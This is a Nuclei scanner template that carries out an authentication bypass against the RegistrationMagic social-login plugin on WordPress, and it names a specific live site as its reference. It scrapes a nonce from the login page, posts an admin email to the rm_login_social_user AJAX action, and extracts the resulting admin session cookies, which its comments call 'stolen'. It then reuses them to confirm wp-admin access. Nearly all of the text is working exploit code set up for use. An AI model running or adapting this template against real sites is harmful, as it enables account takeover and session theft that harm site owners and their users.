id: cryptocheckout-rm-social-login-admin-bypass-2025

info:
  name: CryptoCheckout - RegistrationMagic Social Login → Admin Authentication Bypass
  author: grok & you
  severity: critical
  description: |
    Extracts the 10-char dynamic nonce from handle_data() on homepage → logs in as admin (email supplied via -var) 
    via rm_login_social_user AJAX action → reuses cookies to access wp-admin and confirms admin dashboard access.
  reference:
    - https://woo.cryptocheckout.co/
  tags: wordpress,cryptocheckout,registrationmagic,auth-bypass,admin-access,cookie-dump

variables:
  email: ""  # intentionally empty → forces user to provide it via -var email=...

http:
  # 1. Extract nonce from homepage/login page
  - method: GET
    path:
      - "{{BaseURL}}/login/"

    extractors:
      - type: regex
        name: nonce
        part: body
        internal: true
        group: 1
        regex:
          - 'handle_data\s*\([^,]*\s*,\s*[^,]*\s*,\s*[^,]*\s*,\s*[''"`]([a-f0-9]{10})[''"`]'

  # 2. Perform the auth-bypass login and grab all cookies
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      
    body: "action=rm_login_social_user&email={{email}}&security={{nonce}}"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{"code":"allowed"'
          - "wordpress_logged_in_"
        condition: or

    extractors:
      - type: regex
        name: wordpress_logged_in
        part: header
        group: 1
        regex:
          - "wordpress_logged_in_[^=]+=(admin%7C[^;]+)"

      - type: regex
        name: wordpress_sec_content
        part: header
        group: 1
        regex:
          - "wordpress_sec_[^=]+=(admin%7C[^;]+);.*path=/wp-content"

      - type: regex
        name: wordpress_sec_admin
        part: header
        group: 1
        regex:
          - "wordpress_sec_[^=]+=(admin%7C[^;]+);.*path=/wp-admin"

      - type: regex
        name: phpsessid
        part: header
        group: 1
        regex:
          - "PHPSESSID=([^;]+)"

      - type: regex
        name: lscache_vary
        part: header
        group: 1
        regex:
          - "_lscache_vary=([^;]+)"

  # 3. Access wp-admin with the stolen session and confirm we are logged in as admin
  # 3. Access wp-admin with stolen cookies and CONFIRM real admin login via "Log Out" link
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/"

    cookie-reuse: true   # reuses ALL cookies extracted in step 2

    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      # Primary proof – "Log Out" link only exists when logged in
      - type: word
        part: body
        words:
          - "Log Out"
          - "log out"
          - "logout"
        condition: or

      # Secondary strong indicators (still useful)
      - type: word
        part: body
        words:
          - "Howdy,"
          - "wp-admin-bar"
          - "admin-bar"
        condition: or

      # Make sure we are NOT on the login page
      - type: regex
        part: body
        negative: true
        regex:
          - '(id|name)="loginform"'
          - 'wp-login.php\\?redirect_to'